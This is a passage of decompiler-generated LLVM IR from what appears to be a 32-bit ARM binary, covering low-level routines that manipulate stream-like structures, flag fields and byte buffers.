  %v1_10cf4 = xor i1 %v9_10cec, true
  call void @__pseudo_cond_branch(i1 %v1_10cf4, i32 ptrtoint (i32* @global_var_e3fc.444 to i32))
  %v0_10cf8 = load i32, i32* %r8.global-to-local, align 4
  %v1_10cf8 = load i32, i32* @r5, align 4
  %v2_10cf8 = add i32 %v1_10cf8, 64
  %v3_10cf8 = inttoptr i32 %v2_10cf8 to i32*
  store i32 %v0_10cf8, i32* %v3_10cf8, align 4
  %v0_10cfc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10cfc

dec_label_pc_10cfc:                               ; preds = %dec_label_pc_10cac, %bb78
  %v0_10cfc = phi i32 [ %v0_10cb8, %dec_label_pc_10cac ], [ %v0_10cfc.pre, %bb78 ]
  %v1_10cfc = add i32 %v0_10cfc, 60
  %v2_10cfc = inttoptr i32 %v1_10cfc to i32*
  %v3_10cfc = load i32, i32* %v2_10cfc, align 4
  %v1_10d00 = add i32 %v3_10cfc, 1
  store i32 %v1_10d00, i32* %r3.global-to-local, align 4
  store i32 %v1_10d00, i32* %v2_10cfc, align 4
  %v0_10d08.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10d08

dec_label_pc_10d08:                               ; preds = %dec_label_pc_10c9c, %dec_label_pc_10cfc
  %v0_10d20 = phi i32 [ %v0_10cb8, %dec_label_pc_10c9c ], [ %v0_10d08.pre, %dec_label_pc_10cfc ]
  %v1_10d08 = inttoptr i32 %v0_10d20 to i16*
  %v2_10d08 = load i16, i16* %v1_10d08, align 2
  %v3_10d08 = zext i16 %v2_10d08 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_10d10 = or i32 %v3_10d08, %stack_var_-44.1
  %v1_10d14 = xor i32 %v2_10d10, 320
  store i32 %v1_10d14, i32* %r3.global-to-local, align 4
  %v1_10d18 = and i32 %v1_10d14, 832
  %v2_10d18 = icmp eq i32 %v1_10d18, 0
  br i1 %v2_10d18, label %dec_label_pc_10d20, label %bb79

dec_label_pc_10d20:                               ; preds = %dec_label_pc_10d08
  store i32 %v0_10d20, i32* %r0.global-to-local, align 4
  %v1_10d24 = call i32 @function_1054c(i32 %v0_10d20)
  store i32 %v1_10d24, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d28 = icmp eq i32 %v1_10d24, 0
  br i1 %v2_10d28, label %.thread12, label %.thread13

.thread12:                                        ; preds = %dec_label_pc_10d20
  %v1_10d2c = load i32, i32* @r5, align 4
  %v2_10d2c = inttoptr i32 %v1_10d2c to i16*
  %v3_10d2c = load i16, i16* %v2_10d2c, align 2
  %v4_10d2c = zext i16 %v3_10d2c to i32
  store i32 %v4_10d2c, i32* %r3.global-to-local, align 4
  %v2_10d30 = add i32 %v1_10d2c, 8
  %v3_10d30 = inttoptr i32 %v2_10d30 to i32*
  %v4_10d30 = load i32, i32* %v3_10d30, align 4
  store i32 %v4_10d30, i32* %r2.global-to-local, align 4
  %v2_10d34 = and i32 %v4_10d2c, 65471
  store i32 %v2_10d34, i32* %r3.global-to-local, align 4
  %v3_10d38 = add i32 %v1_10d2c, 28
  %v4_10d38 = inttoptr i32 %v3_10d38 to i32*
  store i32 %v4_10d30, i32* %v4_10d38, align 4
  %v1_10d3c = load i32, i32* %r3.global-to-local, align 4
  %v2_10d3c = trunc i32 %v1_10d3c to i16
  %v3_10d3c = load i32, i32* @r5, align 4
  %v4_10d3c = inttoptr i32 %v3_10d3c to i16*
  store i16 %v2_10d3c, i16* %v4_10d3c, align 2
  br label %bb79

.thread13:                                        ; preds = %dec_label_pc_10d20
  %v1_10d40 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_10d40, i32* %sl.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %.thread12, %dec_label_pc_10d08, %.thread13
  %v0_10d44 = load i32, i32* @r6, align 4
  %v1_10d44 = load i32, i32* %sb.global-to-local, align 4
  %v2_10d44 = add i32 %v1_10d44, %v0_10d44
  %v3_10d44 = inttoptr i32 %v2_10d44 to i32*
  %v4_10d44 = load i32, i32* %v3_10d44, align 4
  store i32 %v4_10d44, i32* %r3.global-to-local, align 4
  %v1_10d48 = inttoptr i32 %v4_10d44 to i32*
  %v2_10d48 = load i32, i32* %v1_10d48, align 4
  store i32 %v2_10d48, i32* %r3.global-to-local, align 4
  %v2_10d4c = icmp ugt i32 %v2_10d48, 1
  store i1 %v2_10d4c, i1* %cpsr_c.global-to-local, align 1
  %v7_10d4c = icmp eq i32 %v2_10d48, 2
  br i1 %v7_10d4c, label %dec_label_pc_10dc8, label %dec_label_pc_10d54

dec_label_pc_10d54:                               ; preds = %bb79
  %v0_10d54 = load i32, i32* @r5, align 4
  %v1_10d54 = add i32 %v0_10d54, 60
  %v2_10d54 = inttoptr i32 %v1_10d54 to i32*
  %v3_10d54 = load i32, i32* %v2_10d54, align 4
  %v1_10d58 = add i32 %v3_10d54, -1
  store i32 %v1_10d58, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d5c = icmp eq i32 %v1_10d58, 0
  store i32 %v1_10d58, i32* %v2_10d54, align 4
  br i1 %v2_10d5c, label %dec_label_pc_10d68, label %dec_label_pc_10dc8

dec_label_pc_10d68:                               ; preds = %dec_label_pc_10d54
  %v0_10d68 = load i32, i32* %r3.global-to-local, align 4
  %v1_10d68 = load i32, i32* @r5, align 4
  %v2_10d68 = add i32 %v1_10d68, 64
  %v3_10d68 = inttoptr i32 %v2_10d68 to i32*
  store i32 %v0_10d68, i32* %v3_10d68, align 4
  %v0_10d6c = load i32, i32* @r5, align 4
  %v1_10d6c = add i32 %v0_10d6c, 56
  store i32 %v1_10d6c, i32* @r7, align 4
  br label %dec_label_pc_10d70

dec_label_pc_10d70:                               ; preds = %dec_label_pc_10da0.dec_label_pc_10d70_crit_edge, %dec_label_pc_10d68
  %v0_10d78 = phi i32 [ %v0_10d78.pre, %dec_label_pc_10da0.dec_label_pc_10d70_crit_edge ], [ %v1_10d6c, %dec_label_pc_10d68 ]
  %v0_10d70 = phi i32 [ %v0_10d70.pre, %dec_label_pc_10da0.dec_label_pc_10d70_crit_edge ], [ %v0_10d6c, %dec_label_pc_10d68 ]
  %v1_10d70 = add i32 %v0_10d70, 56
  %v2_10d70 = inttoptr i32 %v1_10d70 to i32*
  %v3_10d70 = load i32, i32* %v2_10d70, align 4
  store i32 %v3_10d70, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_10d78, i32* %r2.global-to-local, align 4
  %v1_10d7c105 = inttoptr i32 %v0_10d78 to i32*
  %v2_10d7c106 = load i32, i32* %v1_10d7c105, align 4
  store i32 %v2_10d7c106, i32* %r3.global-to-local, align 4
  %v3_10d80108 = icmp uge i32 %v2_10d7c106, %v3_10d70
  store i1 %v3_10d80108, i1* %cpsr_c.global-to-local, align 1
  %v9_10d80114 = icmp eq i32 %v2_10d7c106, %v3_10d70
  br i1 %v9_10d80114, label %dec_label_pc_10d88, label %dec_label_pc_10da0

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d70, %dec_label_pc_10d88.dec_label_pc_10d7c_crit_edge
  %v0_10d88115 = phi i32 [ %v1_10d80.pre, %dec_label_pc_10d88.dec_label_pc_10d7c_crit_edge ], [ %v3_10d70, %dec_label_pc_10d70 ]
  store i32 %v0_10d88115, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_10d98 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10d98, label %dec_label_pc_10d9c, label %dec_label_pc_10d88.dec_label_pc_10d7c_crit_edge

dec_label_pc_10d88.dec_label_pc_10d7c_crit_edge:  ; preds = %dec_label_pc_10d88
  %v0_10d7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10d80.pre = load i32, i32* @r4, align 4
  %v1_10d7c = inttoptr i32 %v0_10d7c.pre to i32*
  %v2_10d7c = load i32, i32* %v1_10d7c, align 4
  store i32 %v2_10d7c, i32* %r3.global-to-local, align 4
  %v3_10d80 = icmp uge i32 %v2_10d7c, %v1_10d80.pre
  store i1 %v3_10d80, i1* %cpsr_c.global-to-local, align 1
  %v9_10d80 = icmp eq i32 %v2_10d7c, %v1_10d80.pre
  br i1 %v9_10d80, label %dec_label_pc_10d88, label %dec_label_pc_10da0

dec_label_pc_10d9c:                               ; preds = %dec_label_pc_10d88
  %v0_10d9c = load i32, i32* @r4, align 4
  store i32 %v0_10d9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d70, %dec_label_pc_10d88.dec_label_pc_10d7c_crit_edge, %dec_label_pc_10d9c
  %v0_10da8 = phi i32 [ %v0_10d9c, %dec_label_pc_10d9c ], [ %v2_10d7c106, %dec_label_pc_10d70 ], [ %v2_10d7c, %dec_label_pc_10d88.dec_label_pc_10d7c_crit_edge ]
  %v1_10da0 = phi i32 [ %v0_10d9c, %dec_label_pc_10d9c ], [ %v3_10d70, %dec_label_pc_10d70 ], [ %v1_10d80.pre, %dec_label_pc_10d88.dec_label_pc_10d7c_crit_edge ]
  %v3_10da0 = icmp uge i32 %v0_10da8, %v1_10da0
  store i1 %v3_10da0, i1* %cpsr_c.global-to-local, align 1
  %v9_10da0 = icmp eq i32 %v0_10da8, %v1_10da0
  br i1 %v9_10da0, label %dec_label_pc_10da8, label %dec_label_pc_10da0.dec_label_pc_10d70_crit_edge

dec_label_pc_10da0.dec_label_pc_10d70_crit_edge:  ; preds = %dec_label_pc_10da0
  %v0_10d70.pre = load i32, i32* @r5, align 4
  %v0_10d78.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10d70

dec_label_pc_10da8:                               ; preds = %dec_label_pc_10da0
  %v2_10da8 = icmp ne i32 %v1_10da0, 0
  store i1 %v2_10da8, i1* %cpsr_c.global-to-local, align 1
  %v7_10dac = icmp slt i32 %v1_10da0, 2
  br i1 %v7_10dac, label %dec_label_pc_10dc8, label %dec_label_pc_10db0

dec_label_pc_10db0:                               ; preds = %dec_label_pc_10da8
  %v0_10db0 = load i32, i32* @r5, align 4
  %v1_10db0 = add i32 %v0_10db0, 56
  store i32 %v1_10db0, i32* %r0.global-to-local, align 4
  %v0_10db4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10db4 = add i32 %v0_10db4, 129
  store i32 %v1_10db4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10dc8

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10d54, %dec_label_pc_10db0, %dec_label_pc_10da8, %bb79, %dec_label_pc_10c90
  %v0_10dc8 = load i32, i32* @r5, align 4
  %v1_10dc8 = add i32 %v0_10dc8, 32
  %v2_10dc8 = inttoptr i32 %v1_10dc8 to i32*
  %v3_10dc8 = load i32, i32* %v2_10dc8, align 4
  store i32 %v3_10dc8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10dcc = icmp eq i32 %v3_10dc8, 0
  br i1 %v2_10dcc, label %dec_label_pc_10dd4, label %dec_label_pc_10c90

dec_label_pc_10dd4:                               ; preds = %dec_label_pc_10dc8, %dec_label_pc_10c80
  %v0_10dd4 = call i32 @function_107dc()
  store i32 %v0_10dd4, i32* %r0.global-to-local, align 4
  %v0_10e10.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb81

dec_label_pc_10ddc:                               ; preds = %dec_label_pc_10ab8
  %v1_10ddc = inttoptr i32 %v0_10dec to i16*
  %v2_10ddc = load i16, i16* %v1_10ddc, align 2
  %v3_10ddc = zext i16 %v2_10ddc to i32
  %v1_10de0 = and i32 %v3_10ddc, 64
  store i32 %v1_10de0, i32* %r3.global-to-local, align 4
  %v2_10de0 = icmp eq i32 %v1_10de0, 0
  br i1 %v2_10de0, label %bb80, label %dec_label_pc_10dec

bb80:                                             ; preds = %dec_label_pc_10ddc
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb81

dec_label_pc_10dec:                               ; preds = %dec_label_pc_10ddc
  %v1_10dec = call i32 @function_1054c(i32 %v0_10dec)
  store i32 %v1_10dec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10df0 = icmp eq i32 %v1_10dec, 0
  br i1 %v2_10df0, label %.thread20, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_10dec
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb81

.thread20:                                        ; preds = %dec_label_pc_10dec
  %v1_10df4 = load i32, i32* @r4, align 4
  %v2_10df4 = inttoptr i32 %v1_10df4 to i16*
  %v3_10df4 = load i16, i16* %v2_10df4, align 2
  %v4_10df4 = zext i16 %v3_10df4 to i32
  store i32 %v4_10df4, i32* %r3.global-to-local, align 4
  %v2_10df8 = add i32 %v1_10df4, 8
  %v3_10df8 = inttoptr i32 %v2_10df8 to i32*
  %v4_10df8 = load i32, i32* %v3_10df8, align 4
  store i32 %v4_10df8, i32* %r2.global-to-local, align 4
  %v2_10dfc = and i32 %v4_10df4, 65471
  store i32 %v2_10dfc, i32* %r3.global-to-local, align 4
  %v2_10e00 = trunc i32 %v2_10dfc to i16
  store i16 %v2_10e00, i16* %v2_10df4, align 2
  %v1_10e04 = load i32, i32* %r2.global-to-local, align 4
  %v2_10e04 = load i32, i32* @r4, align 4
  %v3_10e04 = add i32 %v2_10e04, 28
  %v4_10e04 = inttoptr i32 %v3_10e04 to i32*
  store i32 %v1_10e04, i32* %v4_10e04, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb81

bb81:                                             ; preds = %bb80, %.thread22, %dec_label_pc_10dd4, %.thread20
  %v0_10e10 = phi i32 [ -1, %.thread22 ], [ 0, %bb80 ], [ %v0_10e10.pre, %dec_label_pc_10dd4 ], [ 0, %.thread20 ]
  store i32 %v0_10e10, i32* %r0.global-to-local, align 4
  store i32 %v6_10a8c, i32* %r5.global-to-local, align 4
  store i32 %v15_10a8c, i32* %r8.global-to-local, align 4
  ret i32 %v0_10e10

; uselistorder directives
  uselistorder i32 %v0_10e10, { 1, 0 }
  uselistorder i32 %v3_10dc8, { 1, 2, 0 }
  uselistorder i32 %v0_10d9c, { 1, 0, 2 }
  uselistorder i32 %v1_10d80.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10d20, { 1, 0, 2 }
  uselistorder i32 %v0_10ce8, { 1, 0, 2 }
  uselistorder i32 %v1_10ccc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10cb0, { 1, 0 }
  uselistorder i32 %v0_10c54, { 1, 0, 2 }
  uselistorder i32 %v1_10c38.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10c28, { 1, 0 }
  uselistorder i32 %v0_10bec, { 1, 0, 2 }
  uselistorder i32 %v1_10bd0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10bb8, { 1, 0 }
  uselistorder i32 %v0_10b80, { 1, 0, 2 }
  uselistorder i32 %v1_10b64.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10b54, { 1, 0 }
  uselistorder i32 %v0_10b10, { 1, 0, 2 }
  uselistorder i32 %v1_10af4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_10acc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10dec, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 51, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 0, 20, 21, 22, 23, 24, 25, 27, 26, 52, 28, 29, 30, 31, 33, 32, 53, 34, 35, 36, 37, 39, 38, 54, 40, 41, 42, 43, 45, 44, 55, 46, 47, 50, 48, 49 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 25, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 2, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 12, 2, 3, 4, 33, 34, 5, 6, 7, 8, 9, 29, 30, 10, 11, 41, 13, 14, 15, 31, 32, 16, 17, 18, 35, 36, 19, 20, 21, 22, 37, 38, 23, 24, 25, 39, 40, 26, 27, 28, 0 }
  uselistorder i32 ()* @function_107dc, { 1, 0 }
  uselistorder i32 56, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 8, 7, 2, 21, 22, 23, 24, 25, 26, 27, 9, 10, 3, 4, 1, 5, 0, 6 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 32, 33, 34, 35, 36, 30, 31 }
  uselistorder i32 -61441, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 33, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 160, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 14, 12, 15, 13, 16, 17, 21, 18, 22, 19, 23, 20, 24 }
  uselistorder label %bb81, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10dc8, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10da0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10d88, { 1, 0 }
  uselistorder label %bb79, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d08, { 1, 0 }
  uselistorder label %dec_label_pc_10cfc, { 1, 0 }
  uselistorder label %bb78, { 1, 0 }
  uselistorder label %dec_label_pc_10cec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10cd4, { 1, 0 }
  uselistorder label %dec_label_pc_10c90, { 1, 0 }
  uselistorder label %dec_label_pc_10c80thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10c58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10c40, { 1, 0 }
  uselistorder label %dec_label_pc_10c00, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_10bf0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10bd8, { 1, 0 }
  uselistorder label %dec_label_pc_10bac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10b84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10b6c, { 1, 0 }
  uselistorder label %dec_label_pc_10b24, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_10b14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10afc, { 1, 0 }
  uselistorder label %dec_label_pc_10ac8, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_10e24(i32 %arg1) local_unnamed_addr {
dec_label_pc_10e24:
  %v0_10e24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10e24, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_10e24
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_10e24, %bb
  %v10_10e34 = phi i32 [ %arg1, %dec_label_pc_10e24 ], [ 0, %bb ]
  ret i32 %v10_10e34

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_10e38(i16* %arg1) local_unnamed_addr {
dec_label_pc_10e38:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_10e38 = load i32, i32* @r4, align 4
  store i32 %v3_10e38, i32* %stack_var_-12, align 4
  %v6_10e38 = load i32, i32* @r5, align 4
  %v9_10e38 = load i32, i32* @lr, align 4
  %v0_10e3c = load i32, i32* @r0, align 4
  %v1_10e3c = add i32 %v0_10e3c, 16
  %v2_10e3c = inttoptr i32 %v1_10e3c to i32*
  %v3_10e3c = load i32, i32* %v2_10e3c, align 4
  store i32 %v3_10e3c, i32* %r2.global-to-local, align 4
  %v1_10e40 = add i32 %v0_10e3c, 24
  %v2_10e40 = inttoptr i32 %v1_10e40 to i32*
  %v3_10e40 = load i32, i32* %v2_10e40, align 4
  %v3_10e44 = icmp ult i32 %v3_10e3c, %v3_10e40
  store i32 %v0_10e3c, i32* @r4, align 4
  br i1 %v3_10e44, label %bb, label %dec_label_pc_10e64

bb:                                               ; preds = %dec_label_pc_10e38
  %v2_10e50 = inttoptr i32 %v3_10e3c to i8*
  %v3_10e50 = load i8, i8* %v2_10e50, align 1
  %v4_10e50 = zext i8 %v3_10e50 to i32
  store i32 %v4_10e50, i32* %r0.global-to-local, align 4
  %v6_10e50 = add i32 %v3_10e3c, 1
  store i32 %v6_10e50, i32* %r2.global-to-local, align 4
  store i32 %v6_10e50, i32* %v2_10e3c, align 4
  br label %dec_label_pc_10f50

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e38
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* @r5, align 4
  %v1_10e64 = inttoptr i32 %v0_10e3c to i16*
  %v2_10e64 = load i16, i16* %v1_10e64, align 2
  %v3_10e64 = zext i16 %v2_10e64 to i32
  %v1_10e68 = and i32 %v3_10e64, 131
  %tmp25 = icmp ugt i32 %v1_10e68, 128
  br i1 %tmp25, label %dec_label_pc_10e84, label %dec_label_pc_10e74

dec_label_pc_10e74:                               ; preds = %dec_label_pc_10e64
  store i32 128, i32* @r1, align 4
  %v0_10e78 = call i32 @function_12440()
  store i32 %v0_10e78, i32* %r0.global-to-local, align 4
  %v2_10e7c = icmp eq i32 %v0_10e78, 0
  br i1 %v2_10e7c, label %dec_label_pc_10e74.dec_label_pc_10e84_crit_edge, label %dec_label_pc_10f4c

dec_label_pc_10e74.dec_label_pc_10e84_crit_edge:  ; preds = %dec_label_pc_10e74
  %v0_10e84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10e84

dec_label_pc_10e84:                               ; preds = %dec_label_pc_10e74.dec_label_pc_10e84_crit_edge, %dec_label_pc_10e64
  %v2_10ec4 = phi i32 [ %v0_10e84.pre, %dec_label_pc_10e74.dec_label_pc_10e84_crit_edge ], [ %v0_10e3c, %dec_label_pc_10e64 ]
  %v1_10e84 = inttoptr i32 %v2_10ec4 to i16*
  %v2_10e84 = load i16, i16* %v1_10e84, align 2
  %v3_10e84 = zext i16 %v2_10e84 to i32
  store i32 %v3_10e84, i32* %r2.global-to-local, align 4
  %v1_10e88 = and i32 %v3_10e84, 2
  %v2_10e88 = icmp eq i32 %v1_10e88, 0
  br i1 %v2_10e88, label %dec_label_pc_10eb4, label %dec_label_pc_10e90

dec_label_pc_10e90:                               ; preds = %dec_label_pc_10e84
  %tmp26 = urem i16 %v2_10e84, 2
  %v1_10e90 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_10e90
  %v4_10e94 = and i32 %tmp22, 4
  %v5_10e94 = add i32 %v4_10e94, %v2_10ec4
  %v1_10e98 = add i32 %v5_10e94, 36
  %v2_10e98 = inttoptr i32 %v1_10e98 to i8*
  %v3_10e98 = load i8, i8* %v2_10e98, align 1
  %v4_10e98 = zext i8 %v3_10e98 to i32
  %v1_10e9c = add nsw i32 %v3_10e84, -1
  store i32 %v1_10e9c, i32* %r2.global-to-local, align 4
  store i32 %v4_10e98, i32* %r0.global-to-local, align 4
  %v2_10ea8 = add i32 %v2_10ec4, 40
  %v3_10ea8 = inttoptr i32 %v2_10ea8 to i32*
  store i32 0, i32* %v3_10ea8, align 4
  %v0_10eac = load i32, i32* %r2.global-to-local, align 4
  %v1_10eac = trunc i32 %v0_10eac to i16
  %v2_10eac = load i32, i32* @r4, align 4
  %v3_10eac = inttoptr i32 %v2_10eac to i16*
  store i16 %v1_10eac, i16* %v3_10eac, align 2
  br label %dec_label_pc_10f50

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10e84
  %v1_10eb4 = add i32 %v2_10ec4, 16
  %v1_10eb8 = inttoptr i32 %v1_10eb4 to i32*
  %v2_10eb8 = load i32, i32* %v1_10eb8, align 4
  store i32 %v2_10eb8, i32* @r1, align 4
  %v3_10eb8 = add i32 %v2_10ec4, 20
  %v4_10eb8 = inttoptr i32 %v3_10eb8 to i32*
  %v5_10eb8 = load i32, i32* %v4_10eb8, align 4
  %v9_10ebc = icmp eq i32 %v5_10eb8, %v2_10eb8
  br i1 %v9_10ebc, label %dec_label_pc_10ecc, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10eb4
  %v2_10ec0 = inttoptr i32 %v2_10eb8 to i8*
  %v3_10ec0 = load i8, i8* %v2_10ec0, align 1
  %v4_10ec0 = zext i8 %v3_10ec0 to i32
  store i32 %v4_10ec0, i32* %r0.global-to-local, align 4
  %v6_10ec0 = add i32 %v2_10eb8, 1
  store i32 %v6_10ec0, i32* @r1, align 4
  store i32 %v6_10ec0, i32* %v1_10eb8, align 4
  br label %dec_label_pc_10f50

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10eb4
  %v1_10ecc = add i32 %v2_10ec4, 4
  %v2_10ecc = inttoptr i32 %v1_10ecc to i32*
  %v3_10ecc = load i32, i32* %v2_10ecc, align 4
  %v7_10ed0 = icmp eq i32 %v3_10ecc, -2
  br i1 %v7_10ed0, label %.thread7, label %dec_label_pc_10ee4

.thread7:                                         ; preds = %dec_label_pc_10ecc
  %v2_10ed4 = or i16 %v2_10e84, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_10ed4, i16* %v1_10e84, align 2
  br label %dec_label_pc_10f50

dec_label_pc_10ee4:                               ; preds = %dec_label_pc_10ecc
  %v1_10ee4 = and i32 %v3_10e84, 768
  %v2_10ee4 = icmp eq i32 %v1_10ee4, 0
  br i1 %v2_10ee4, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_10ee4
  %v1_10eec = load i32, i32* @r5, align 4
  %v3_10eec = add i32 %v1_10eec, 76
  %v4_10eec = inttoptr i32 %v3_10eec to i32*
  %v5_10eec = load i32, i32* %v4_10eec, align 4
  store i32 %v5_10eec, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_10ee4, %bb23
  store i32 69364, i32* @lr, align 4
  %v1_10ef0 = xor i1 %v2_10ee4, true
  call void @__pseudo_cond_branch(i1 %v1_10ef0, i32 ptrtoint (i32* @global_var_10a8c.445 to i32))
  %v0_10ef4 = load i32, i32* @r4, align 4
  %v1_10ef4 = add i32 %v0_10ef4, 8
  store i32 %v1_10ef4, i32* %r2.global-to-local, align 4
  %v1_10ef8 = inttoptr i32 %v1_10ef4 to i32*
  %v2_10ef8 = load i32, i32* %v1_10ef8, align 4
  store i32 %v2_10ef8, i32* %r2.global-to-local, align 4
  %v3_10ef8 = add i32 %v0_10ef4, 12
  %v4_10ef8 = inttoptr i32 %v3_10ef8 to i32*
  %v5_10ef8 = load i32, i32* %v4_10ef8, align 4
  %v9_10efc = icmp eq i32 %v5_10ef8, %v2_10ef8
  br i1 %v9_10efc, label %dec_label_pc_10f30, label %dec_label_pc_10f04

dec_label_pc_10f04:                               ; preds = %.thread9
  %v2_10f04 = add i32 %v0_10ef4, 24
  %v3_10f04 = inttoptr i32 %v2_10f04 to i32*
  store i32 %v2_10ef8, i32* %v3_10f04, align 4
  %v0_10f08 = load i32, i32* @r4, align 4
  store i32 %v0_10f08, i32* %r0.global-to-local, align 4
  %v2_10f0c = call i32 @function_12410(i32 %v0_10f08)
  store i32 %v2_10f0c, i32* %r0.global-to-local, align 4
  %v2_10f10 = icmp eq i32 %v2_10f0c, 0
  br i1 %v2_10f10, label %dec_label_pc_10f4c, label %dec_label_pc_10f18

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10f04
  %v0_10f18 = load i32, i32* @r4, align 4
  %v1_10f18 = add i32 %v0_10f18, 20
  %v2_10f18 = inttoptr i32 %v1_10f18 to i32*
  %v3_10f18 = load i32, i32* %v2_10f18, align 4
  %v2_10f1c = add i32 %v0_10f18, 24
  %v3_10f1c = inttoptr i32 %v2_10f1c to i32*
  store i32 %v3_10f18, i32* %v3_10f1c, align 4
  %v0_10f20 = load i32, i32* @r4, align 4
  %v1_10f20 = add i32 %v0_10f20, 16
  %v2_10f20 = inttoptr i32 %v1_10f20 to i32*
  %v3_10f20 = load i32, i32* %v2_10f20, align 4
  %v1_10f24 = inttoptr i32 %v3_10f20 to i8*
  %v2_10f24 = load i8, i8* %v1_10f24, align 1
  %v3_10f24 = zext i8 %v2_10f24 to i32
  store i32 %v3_10f24, i32* %r0.global-to-local, align 4
  %v5_10f24 = add i32 %v3_10f20, 1
  store i32 %v5_10f24, i32* %v2_10f20, align 4
  br label %dec_label_pc_10f50

dec_label_pc_10f30:                               ; preds = %.thread9
  %v1_10f30 = inttoptr i32 %v0_10ef4 to i16*
  store i32 %v0_10ef4, i32* %r0.global-to-local, align 4
